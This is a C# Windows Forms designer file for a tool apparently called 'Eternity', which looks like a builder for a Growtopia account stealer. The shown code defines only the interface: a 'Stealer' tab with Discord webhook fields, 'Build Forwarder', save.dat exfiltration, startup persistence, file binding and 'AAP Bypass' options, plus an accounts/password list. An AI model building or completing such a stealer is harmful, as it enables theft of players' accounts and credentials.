using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Eternity.Properties;
using MetroFramework.Components;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.CSharp;

namespace Eternity
{
    public class Main : MetroForm
	{
		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
            this.metroStyleManager1 = new MetroFramework.Components.MetroStyleManager(this.components);
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
            this.metroButton3 = new MetroFramework.Controls.MetroButton();
            this.UnbannerTab = new MetroFramework.Controls.MetroTabPage();
            this.panel2 = new System.Windows.Forms.Panel();
            this.panel1 = new System.Windows.Forms.Panel();
            this.groupBox5 = new System.Windows.Forms.GroupBox();
            this.panel3 = new System.Windows.Forms.Panel();
            this.label5 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.metroButton12 = new MetroFramework.Controls.MetroButton();
            this.label2 = new System.Windows.Forms.Label();
            this.metroTextBox3 = new MetroFramework.Controls.MetroTextBox();
            this.metroButton11 = new MetroFramework.Controls.MetroButton();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.metroButton4 = new MetroFramework.Controls.MetroButton();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.metroButton9 = new MetroFramework.Controls.MetroButton();
            this.metroButton6 = new MetroFramework.Controls.MetroButton();
            this.metroButton7 = new MetroFramework.Controls.MetroButton();
            this.metroButton8 = new MetroFramework.Controls.MetroButton();
            this.EternityTabs = new MetroFramework.Controls.MetroTabControl();
            this.StealerTab = new MetroFramework.Controls.MetroTabPage();
            this.groupBox6 = new System.Windows.Forms.GroupBox();
            this.metroCheckBox1 = new MetroFramework.Controls.MetroCheckBox();
            this.metroCheckBox2 = new MetroFramework.Controls.MetroCheckBox();
            this.metroButton13 = new MetroFramework.Controls.MetroButton();
            this.metroButton14 = new MetroFramework.Controls.MetroButton();
            this.metroCheckBox3 = new MetroFramework.Controls.MetroCheckBox();
            this.metroCheckBox4 = new MetroFramework.Controls.MetroCheckBox();
            this.metroCheckBox5 = new MetroFramework.Controls.MetroCheckBox();
            this.metroCheckBox6 = new MetroFramework.Controls.MetroCheckBox();
            this.metroCheckBox7 = new MetroFramework.Controls.MetroCheckBox();
            this.metroCheckBox8 = new MetroFramework.Controls.MetroCheckBox();
            this.metroButton1 = new MetroFramework.Controls.MetroButton();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.file = new MetroFramework.Controls.MetroTextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.url = new MetroFramework.Controls.MetroTextBox();
            this.SavedatsTab = new MetroFramework.Controls.MetroTabPage();
            this.zz = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.metroLabel1 = new MetroFramework.Controls.MetroLabel();
            this.metroButton5 = new MetroFramework.Controls.MetroButton();
            this.deleteAccountToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.AAPIniDialog = new System.Windows.Forms.OpenFileDialog();
            this.BinderFileDialog = new System.Windows.Forms.OpenFileDialog();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.txtPEName = new MetroFramework.Components.MetroStyleManager(this.components);
            this.metroTextBox1 = new MetroFramework.Components.MetroStyleManager(this.components);
            ((System.ComponentModel.ISupportInitialize)(this.metroStyleManager1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.UnbannerTab.SuspendLayout();
            this.groupBox5.SuspendLayout();
            this.groupBox4.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.EternityTabs.SuspendLayout();
            this.StealerTab.SuspendLayout();
            this.groupBox6.SuspendLayout();
            this.groupBox1.SuspendLayout();
            this.SavedatsTab.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.txtPEName)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.metroTextBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // metroStyleManager1
            // 
            this.metroStyleManager1.Owner = this;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox1.Location = new System.Drawing.Point(657, 413);
            this.pictureBox1.Margin = new System.Windows.Forms.Padding(2);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(41, 41);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 14;
            this.pictureBox1.TabStop = false;
            // 
            // metroButton3
            // 
            this.metroButton3.Highlight = true;
            this.metroButton3.Location = new System.Drawing.Point(600, 27);
            this.metroButton3.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton3.Name = "metroButton3";
            this.metroButton3.Size = new System.Drawing.Size(84, 21);
            this.metroButton3.Style = MetroFramework.MetroColorStyle.Magenta;
            this.metroButton3.TabIndex = 11;
            this.metroButton3.TabStop = false;
            this.metroButton3.Text = "Change style";
            this.metroButton3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton3.Click += new System.EventHandler(this.metroButton3_Click);
            // 
            // UnbannerTab
            // 
            this.UnbannerTab.Controls.Add(this.panel2);
            this.UnbannerTab.Controls.Add(this.panel1);
            this.UnbannerTab.Controls.Add(this.groupBox5);
            this.UnbannerTab.Controls.Add(this.groupBox4);
            this.UnbannerTab.Controls.Add(this.groupBox3);
            this.UnbannerTab.HorizontalScrollbarBarColor = true;
            this.UnbannerTab.HorizontalScrollbarSize = 8;
            this.UnbannerTab.Location = new System.Drawing.Point(4, 44);
            this.UnbannerTab.Margin = new System.Windows.Forms.Padding(2);
            this.UnbannerTab.Name = "UnbannerTab";
            this.UnbannerTab.Size = new System.Drawing.Size(607, 362);
            this.UnbannerTab.TabIndex = 1;
            this.UnbannerTab.Text = "Miscellaneous";
            this.UnbannerTab.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.UnbannerTab.VerticalScrollbarBarColor = true;
            this.UnbannerTab.VerticalScrollbarSize = 8;
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.White;
            this.panel2.Location = new System.Drawing.Point(315, 114);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(289, 1);
            this.panel2.TabIndex = 20;
            // 
            // panel1
            // 
            this.panel1.Location = new System.Drawing.Point(316, 142);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(289, 1);
            this.panel1.TabIndex = 19;
            this.panel1.Visible = false;
            // 
            // groupBox5
            // 
            this.groupBox5.BackColor = System.Drawing.Color.Transparent;
            this.groupBox5.Controls.Add(this.panel3);
            this.groupBox5.Controls.Add(this.label5);
            this.groupBox5.Controls.Add(this.label4);
            this.groupBox5.Controls.Add(this.metroButton12);
            this.groupBox5.Controls.Add(this.label2);
            this.groupBox5.Controls.Add(this.metroTextBox3);
            this.groupBox5.Controls.Add(this.metroButton11);
            this.groupBox5.Font = new System.Drawing.Font("Segoe UI Light", 12F);
            this.groupBox5.ForeColor = System.Drawing.Color.White;
            this.groupBox5.Location = new System.Drawing.Point(316, 35);
            this.groupBox5.Margin = new System.Windows.Forms.Padding(2);
            this.groupBox5.Name = "groupBox5";
            this.groupBox5.Padding = new System.Windows.Forms.Padding(2);
            this.groupBox5.Size = new System.Drawing.Size(289, 269);
            this.groupBox5.TabIndex = 13;
            this.groupBox5.TabStop = false;
            this.groupBox5.Text = "Save.dat decoder (Coming Soon)";
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.White;
            this.panel3.Location = new System.Drawing.Point(129, 80);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(1, 190);
            this.panel3.TabIndex = 20;
            this.panel3.Visible = false;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Segoe UI Light", 13F);
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(162, 79);
            this.label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(89, 25);
            this.label5.TabIndex = 18;
            this.label5.Text = "Passwords";
            this.label5.Visible = false;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.Transparent;
            this.label4.Font = new System.Drawing.Font("Segoe UI Light", 13F);
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(29, 79);
            this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(68, 25);
            this.label4.TabIndex = 17;
            this.label4.Text = "GrowID";
            this.label4.Visible = false;
            // 
            // metroButton12
            // 
            this.metroButton12.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.metroButton12.Enabled = false;
            this.metroButton12.Location = new System.Drawing.Point(256, 35);
            this.metroButton12.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton12.Name = "metroButton12";
            this.metroButton12.Size = new System.Drawing.Size(22, 22);
            this.metroButton12.TabIndex = 16;
            this.metroButton12.Text = "...";
            this.metroButton12.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton12.Visible = false;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Font = new System.Drawing.Font("Segoe UI Light", 13F);
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(17, 31);
            this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(90, 25);
            this.label2.TabIndex = 12;
            this.label2.Text = "Save path:";
            this.label2.Visible = false;
            // 
            // metroTextBox3
            // 
            this.metroTextBox3.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.metroTextBox3.Location = new System.Drawing.Point(109, 34);
            this.metroTextBox3.Multiline = true;
            this.metroTextBox3.Name = "metroTextBox3";
            this.metroTextBox3.Size = new System.Drawing.Size(142, 23);
            this.metroTextBox3.TabIndex = 11;
            this.metroTextBox3.TabStop = false;
            this.metroTextBox3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox3.Visible = false;
            // 
            // metroButton11
            // 
            this.metroButton11.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.metroButton11.Highlight = true;
            this.metroButton11.Location = new System.Drawing.Point(484, 30);
            this.metroButton11.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton11.Name = "metroButton11";
            this.metroButton11.Size = new System.Drawing.Size(0, 144);
            this.metroButton11.TabIndex = 2;
            this.metroButton11.Text = "Decode";
            // 
            // groupBox4
            // 
            this.groupBox4.BackColor = System.Drawing.Color.Transparent;
            this.groupBox4.Controls.Add(this.metroButton4);
            this.groupBox4.Font = new System.Drawing.Font("Segoe UI Light", 12F);
            this.groupBox4.ForeColor = System.Drawing.Color.White;
            this.groupBox4.Location = new System.Drawing.Point(17, 188);
            this.groupBox4.Margin = new System.Windows.Forms.Padding(2);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Padding = new System.Windows.Forms.Padding(2);
            this.groupBox4.Size = new System.Drawing.Size(278, 116);
            this.groupBox4.TabIndex = 12;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "Unbanner";
            // 
            // metroButton4
            // 
            this.metroButton4.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.metroButton4.Highlight = true;
            this.metroButton4.Location = new System.Drawing.Point(36, 35);
            this.metroButton4.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton4.Name = "metroButton4";
            this.metroButton4.Size = new System.Drawing.Size(205, 60);
            this.metroButton4.Style = MetroFramework.MetroColorStyle.Magenta;
            this.metroButton4.TabIndex = 2;
            this.metroButton4.Text = "Unban";
            this.metroButton4.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton4.Click += new System.EventHandler(this.metroButton4_Click);
            // 
            // groupBox3
            // 
            this.groupBox3.BackColor = System.Drawing.Color.Transparent;
            this.groupBox3.Controls.Add(this.metroButton9);
            this.groupBox3.Controls.Add(this.metroButton6);
            this.groupBox3.Controls.Add(this.metroButton7);
            this.groupBox3.Controls.Add(this.metroButton8);
            this.groupBox3.Font = new System.Drawing.Font("Segoe UI Light", 12F);
            this.groupBox3.ForeColor = System.Drawing.Color.White;
            this.groupBox3.Location = new System.Drawing.Point(17, 35);
            this.groupBox3.Margin = new System.Windows.Forms.Padding(2);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Padding = new System.Windows.Forms.Padding(2);
            this.groupBox3.Size = new System.Drawing.Size(278, 140);
            this.groupBox3.TabIndex = 6;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Proxy";
            // 
            // metroButton9
            // 
            this.metroButton9.Highlight = true;
            this.metroButton9.Location = new System.Drawing.Point(147, 84);
            this.metroButton9.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton9.Name = "metroButton9";
            this.metroButton9.Size = new System.Drawing.Size(111, 28);
            this.metroButton9.Style = MetroFramework.MetroColorStyle.Magenta;
            this.metroButton9.TabIndex = 11;
            this.metroButton9.Text = "Stop Proxy";
            this.metroButton9.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton9.Click += new System.EventHandler(this.metroButton9_Click_1);
            // 
            // metroButton6
            // 
            this.metroButton6.Highlight = true;
            this.metroButton6.Location = new System.Drawing.Point(147, 40);
            this.metroButton6.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton6.Name = "metroButton6";
            this.metroButton6.Size = new System.Drawing.Size(111, 28);
            this.metroButton6.Style = MetroFramework.MetroColorStyle.Magenta;
            this.metroButton6.TabIndex = 8;
            this.metroButton6.Text = "Start Proxy";
            this.metroButton6.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton6.Click += new System.EventHandler(this.metroButton6_Click);
            // 
            // metroButton7
            // 
            this.metroButton7.Highlight = true;
            this.metroButton7.Location = new System.Drawing.Point(20, 40);
            this.metroButton7.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton7.Name = "metroButton7";
            this.metroButton7.Size = new System.Drawing.Size(111, 28);
            this.metroButton7.Style = MetroFramework.MetroColorStyle.Magenta;
            this.metroButton7.TabIndex = 9;
            this.metroButton7.Text = "Enable Hosts";
            this.metroButton7.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton7.Click += new System.EventHandler(this.metroButton7_Click_1);
            // 
            // metroButton8
            // 
            this.metroButton8.Highlight = true;
            this.metroButton8.Location = new System.Drawing.Point(20, 84);
            this.metroButton8.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton8.Name = "metroButton8";
            this.metroButton8.Size = new System.Drawing.Size(111, 28);
            this.metroButton8.Style = MetroFramework.MetroColorStyle.Magenta;
            this.metroButton8.TabIndex = 10;
            this.metroButton8.Text = "Disable Hosts";
            this.metroButton8.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton8.Click += new System.EventHandler(this.metroButton8_Click_1);
            // 
            // EternityTabs
            // 
            this.EternityTabs.Controls.Add(this.StealerTab);
            this.EternityTabs.Controls.Add(this.SavedatsTab);
            this.EternityTabs.Controls.Add(this.UnbannerTab);
            this.EternityTabs.ItemSize = new System.Drawing.Size(150, 40);
            this.EternityTabs.Location = new System.Drawing.Point(26, 57);
            this.EternityTabs.Margin = new System.Windows.Forms.Padding(2);
            this.EternityTabs.Name = "EternityTabs";
            this.EternityTabs.SelectedIndex = 0;
            this.EternityTabs.Size = new System.Drawing.Size(615, 410);
            this.EternityTabs.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.EternityTabs.Style = MetroFramework.MetroColorStyle.Magenta;
            this.EternityTabs.TabIndex = 15;
            this.EternityTabs.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.EternityTabs.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // StealerTab
            // 
            this.StealerTab.Controls.Add(this.groupBox6);
            this.StealerTab.Controls.Add(this.metroButton1);
            this.StealerTab.Controls.Add(this.groupBox1);
            this.StealerTab.HorizontalScrollbarBarColor = true;
            this.StealerTab.HorizontalScrollbarSize = 8;
            this.StealerTab.Location = new System.Drawing.Point(4, 44);
            this.StealerTab.Margin = new System.Windows.Forms.Padding(2);
            this.StealerTab.Name = "StealerTab";
            this.StealerTab.Size = new System.Drawing.Size(607, 362);
            this.StealerTab.Style = MetroFramework.MetroColorStyle.Blue;
            this.StealerTab.TabIndex = 0;
            this.StealerTab.Text = "Stealer";
            this.StealerTab.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.StealerTab.VerticalScrollbarBarColor = true;
            this.StealerTab.VerticalScrollbarSize = 8;
            // 
            // groupBox6
            // 
            this.groupBox6.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.groupBox6.BackColor = System.Drawing.Color.Transparent;
            this.groupBox6.Controls.Add(this.metroCheckBox1);
            this.groupBox6.Controls.Add(this.metroCheckBox2);
            this.groupBox6.Controls.Add(this.metroButton13);
            this.groupBox6.Controls.Add(this.metroButton14);
            this.groupBox6.Controls.Add(this.metroCheckBox3);
            this.groupBox6.Controls.Add(this.metroCheckBox4);
            this.groupBox6.Controls.Add(this.metroCheckBox5);
            this.groupBox6.Controls.Add(this.metroCheckBox6);
            this.groupBox6.Controls.Add(this.metroCheckBox7);
            this.groupBox6.Controls.Add(this.metroCheckBox8);
            this.groupBox6.Font = new System.Drawing.Font("Segoe UI Light", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox6.ForeColor = System.Drawing.Color.White;
            this.groupBox6.Location = new System.Drawing.Point(19, 154);
            this.groupBox6.Margin = new System.Windows.Forms.Padding(2);
            this.groupBox6.Name = "groupBox6";
            this.groupBox6.Padding = new System.Windows.Forms.Padding(2);
            this.groupBox6.Size = new System.Drawing.Size(574, 109);
            this.groupBox6.TabIndex = 20;
            this.groupBox6.TabStop = false;
            this.groupBox6.Text = "Settings";
            // 
            // metroCheckBox1
            // 
            this.metroCheckBox1.AutoSize = true;
            this.metroCheckBox1.Location = new System.Drawing.Point(392, 23);
            this.metroCheckBox1.Margin = new System.Windows.Forms.Padding(2);
            this.metroCheckBox1.Name = "metroCheckBox1";
            this.metroCheckBox1.Size = new System.Drawing.Size(106, 15);
            this.metroCheckBox1.TabIndex = 19;
            this.metroCheckBox1.TabStop = false;
            this.metroCheckBox1.Text = "Send to Discord";
            this.metroCheckBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroCheckBox2
            // 
            this.metroCheckBox2.AutoSize = true;
            this.metroCheckBox2.Location = new System.Drawing.Point(206, 73);
            this.metroCheckBox2.Margin = new System.Windows.Forms.Padding(2);
            this.metroCheckBox2.Name = "metroCheckBox2";
            this.metroCheckBox2.Size = new System.Drawing.Size(78, 15);
            this.metroCheckBox2.TabIndex = 18;
            this.metroCheckBox2.TabStop = false;
            this.metroCheckBox2.Text = "File Binder";
            this.metroCheckBox2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroCheckBox2.CheckedChanged += new System.EventHandler(this.metroCheckBox2_CheckedChanged);
            // 
            // metroButton13
            // 
            this.metroButton13.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.metroButton13.Enabled = false;
            this.metroButton13.Location = new System.Drawing.Point(80, 75);
            this.metroButton13.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton13.Name = "metroButton13";
            this.metroButton13.Size = new System.Drawing.Size(22, 22);
            this.metroButton13.TabIndex = 15;
            this.metroButton13.Text = "...";
            this.metroButton13.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroButton14
            // 
            this.metroButton14.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.metroButton14.Enabled = false;
            this.metroButton14.Location = new System.Drawing.Point(301, 73);
            this.metroButton14.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton14.Name = "metroButton14";
            this.metroButton14.Size = new System.Drawing.Size(22, 22);
            this.metroButton14.TabIndex = 17;
            this.metroButton14.Text = "...";
            this.metroButton14.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroCheckBox3
            // 
            this.metroCheckBox3.AutoSize = true;
            this.metroCheckBox3.Location = new System.Drawing.Point(16, 73);
            this.metroCheckBox3.Margin = new System.Windows.Forms.Padding(2);
            this.metroCheckBox3.Name = "metroCheckBox3";
            this.metroCheckBox3.Size = new System.Drawing.Size(46, 15);
            this.metroCheckBox3.TabIndex = 16;
            this.metroCheckBox3.TabStop = false;
            this.metroCheckBox3.Text = "Icon";
            this.metroCheckBox3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroCheckBox3.CheckedChanged += new System.EventHandler(this.metroCheckBox3_CheckedChanged);
            // 
            // metroCheckBox4
            // 
            this.metroCheckBox4.AutoSize = true;
            this.metroCheckBox4.Location = new System.Drawing.Point(392, 48);
            this.metroCheckBox4.Margin = new System.Windows.Forms.Padding(2);
            this.metroCheckBox4.Name = "metroCheckBox4";
            this.metroCheckBox4.Size = new System.Drawing.Size(80, 15);
            this.metroCheckBox4.TabIndex = 5;
            this.metroCheckBox4.TabStop = false;
            this.metroCheckBox4.Text = "Anti-Spam";
            this.metroCheckBox4.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroCheckBox5
            // 
            this.metroCheckBox5.AutoSize = true;
            this.metroCheckBox5.Enabled = false;
            this.metroCheckBox5.Location = new System.Drawing.Point(206, 48);
            this.metroCheckBox5.Margin = new System.Windows.Forms.Padding(2);
            this.metroCheckBox5.Name = "metroCheckBox5";
            this.metroCheckBox5.Size = new System.Drawing.Size(101, 15);
            this.metroCheckBox5.TabIndex = 4;
            this.metroCheckBox5.TabStop = false;
            this.metroCheckBox5.Text = "Get screenshot";
            this.metroCheckBox5.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroCheckBox6
            // 
            this.metroCheckBox6.AutoSize = true;
            this.metroCheckBox6.Location = new System.Drawing.Point(206, 23);
            this.metroCheckBox6.Margin = new System.Windows.Forms.Padding(2);
            this.metroCheckBox6.Name = "metroCheckBox6";
            this.metroCheckBox6.Size = new System.Drawing.Size(105, 15);
            this.metroCheckBox6.TabIndex = 3;
            this.metroCheckBox6.TabStop = false;
            this.metroCheckBox6.Text = "Copy to startup";
            this.metroCheckBox6.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroCheckBox7
            // 
            this.metroCheckBox7.AutoSize = true;
            this.metroCheckBox7.Location = new System.Drawing.Point(16, 48);
            this.metroCheckBox7.Margin = new System.Windows.Forms.Padding(2);
            this.metroCheckBox7.Name = "metroCheckBox7";
            this.metroCheckBox7.Size = new System.Drawing.Size(114, 15);
            this.metroCheckBox7.TabIndex = 2;
            this.metroCheckBox7.TabStop = false;
            this.metroCheckBox7.Text = "Send save.dat file";
            this.metroCheckBox7.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroCheckBox8
            // 
            this.metroCheckBox8.AutoSize = true;
            this.metroCheckBox8.Location = new System.Drawing.Point(16, 23);
            this.metroCheckBox8.Margin = new System.Windows.Forms.Padding(2);
            this.metroCheckBox8.Name = "metroCheckBox8";
            this.metroCheckBox8.Size = new System.Drawing.Size(85, 15);
            this.metroCheckBox8.TabIndex = 0;
            this.metroCheckBox8.TabStop = false;
            this.metroCheckBox8.Text = "AAP Bypass";
            this.metroCheckBox8.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroButton1
            // 
            this.metroButton1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.metroButton1.Highlight = true;
            this.metroButton1.Location = new System.Drawing.Point(19, 289);
            this.metroButton1.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton1.Name = "metroButton1";
            this.metroButton1.Size = new System.Drawing.Size(182, 50);
            this.metroButton1.Style = MetroFramework.MetroColorStyle.Magenta;
            this.metroButton1.TabIndex = 9;
            this.metroButton1.TabStop = false;
            this.metroButton1.Text = "Build Forwarder";
            this.metroButton1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton1.Click += new System.EventHandler(this.metroButton1_Click_1);
            // 
            // groupBox1
            // 
            this.groupBox1.BackColor = System.Drawing.Color.Transparent;
            this.groupBox1.Controls.Add(this.file);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.Controls.Add(this.url);
            this.groupBox1.Font = new System.Drawing.Font("Segoe UI Light", 12F);
            this.groupBox1.ForeColor = System.Drawing.Color.White;
            this.groupBox1.Location = new System.Drawing.Point(19, 37);
            this.groupBox1.Margin = new System.Windows.Forms.Padding(2);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Padding = new System.Windows.Forms.Padding(2);
            this.groupBox1.Size = new System.Drawing.Size(574, 104);
            this.groupBox1.TabIndex = 5;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Discord Webhooks";
            // 
            // file
            // 
            this.file.Location = new System.Drawing.Point(185, 68);
            this.file.Multiline = true;
            this.file.Name = "file";
            this.file.Size = new System.Drawing.Size(384, 22);
            this.file.TabIndex = 14;
            this.file.TabStop = false;
            this.file.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Segoe UI Light", 13F);
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(12, 65);
            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(160, 25);
            this.label3.TabIndex = 11;
            this.label3.Text = "Webhook Files URL:";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Segoe UI Light", 13F);
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(49, 29);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(123, 25);
            this.label1.TabIndex = 2;
            this.label1.Text = "Webhook URL:";
            // 
            // url
            // 
            this.url.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.url.Location = new System.Drawing.Point(185, 31);
            this.url.Multiline = true;
            this.url.Name = "url";
            this.url.Size = new System.Drawing.Size(384, 23);
            this.url.TabIndex = 13;
            this.url.TabStop = false;
            this.url.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // SavedatsTab
            // 
            this.SavedatsTab.Controls.Add(this.zz);
            this.SavedatsTab.Controls.Add(this.metroLabel1);
            this.SavedatsTab.Controls.Add(this.metroButton5);
            this.SavedatsTab.HorizontalScrollbarBarColor = true;
            this.SavedatsTab.Location = new System.Drawing.Point(4, 44);
            this.SavedatsTab.Name = "SavedatsTab";
            this.SavedatsTab.Size = new System.Drawing.Size(607, 362);
            this.SavedatsTab.TabIndex = 3;
            this.SavedatsTab.Text = "Accounts";
            this.SavedatsTab.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.SavedatsTab.VerticalScrollbarBarColor = true;
            // 
            // zz
            // 
            this.zz.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.zz.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader3,
            this.columnHeader4});
            this.zz.Font = new System.Drawing.Font("Segoe UI Semilight", 12F);
            this.zz.ForeColor = System.Drawing.Color.White;
            this.zz.FullRowSelect = true;
            this.zz.HideSelection = false;
            this.zz.Location = new System.Drawing.Point(3, 2);
            this.zz.Name = "zz";
            this.zz.Size = new System.Drawing.Size(608, 313);
            this.zz.TabIndex = 7;
            this.zz.UseCompatibleStateImageBehavior = false;
            this.zz.View = System.Windows.Forms.View.Details;
            this.zz.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(this.zz_DrawColumnHeader);
            this.zz.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(this.zz_DrawItem);
